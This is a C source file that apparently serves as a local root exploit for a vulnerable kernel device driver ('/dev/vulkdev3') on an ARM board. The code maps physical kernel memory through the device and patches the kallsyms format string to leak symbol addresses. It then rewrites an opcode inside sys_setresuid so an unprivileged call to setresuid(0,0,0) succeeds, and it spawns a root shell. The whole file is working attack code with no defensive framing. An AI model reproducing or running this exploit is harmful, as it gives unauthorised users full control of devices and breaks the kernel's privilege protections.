#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

/*
based on j6 device:
# cat /proc/iomem
40d01000-40d010ff : mmu_cfg
40d02000-40d020ff : mmu_cfg
...
58060000-58078fff : core
58882000-588820ff : mmu_cfg
5c000000-5ffffffe : qspi_mmap
80000000-feefffff : System RAM
  80008000-80940023 : Kernel code
  80a5c000-80b2aaab : Kernel data
*/
#define MMAP_START  0x42424000
#define MMAP_SIZE   0xb30000   // 0x7EEFFFFF
#define MMAP_OFFSET 0x80000000

#define KERNEL_ADDR 0xc0000000

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int kernel_mmap1(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	unsigned int *addr;
	unsigned long start;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	addr = (unsigned int *)mmap((void *)MMAP_START, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, MMAP_OFFSET);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	start = (unsigned long)addr;
	printf("mmap addr: %lx\n", start);
	uid = getuid();
	printf("uid = %d\n", uid);

	unsigned long sys_setresuid = 0;
	printf("search string \"%%pK %%c %%s\\n\" in memory...\n");
	while ((unsigned long)addr < start + MMAP_SIZE - 0x40) {
		char *str = (char *)addr;
		if (!strcmp(str, "%pK %c %s\n")) {
			printf("found string, addr = %p\n", str);
			printf("patch string...\n");
			str[2] = ' ';
			sys_setresuid = get_symbol("sys_setresuid");
			break;
		}
		addr++;
	}
	if (sys_setresuid) {
		// restore "%pK %c %s\n"
		char *str = (char *)addr;
		str[2] = 'K';
		printf("sys_setresuid = 0x%lx\n", sys_setresuid);
		unsigned int *p = (unsigned int *)(sys_setresuid - KERNEL_ADDR + start);
		unsigned int *end = p + 200;
		while (p < end) {
			if (*p == 0xe3500000) {
				printf("found target opcode, addr=%p\n", p);
				printf("patch opcode...\n");
				*p = 0xe3500001;
				break;
			}
			p++;
		}
		sleep(2);
		if (*p == 0xe3500001) {
			printf("patch opcode done\n");
			setresuid(0, 0, 0);
			*p = 0xe3500000;
		} else {
			printf("patch opcode failed\n");
		}
	}
	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}

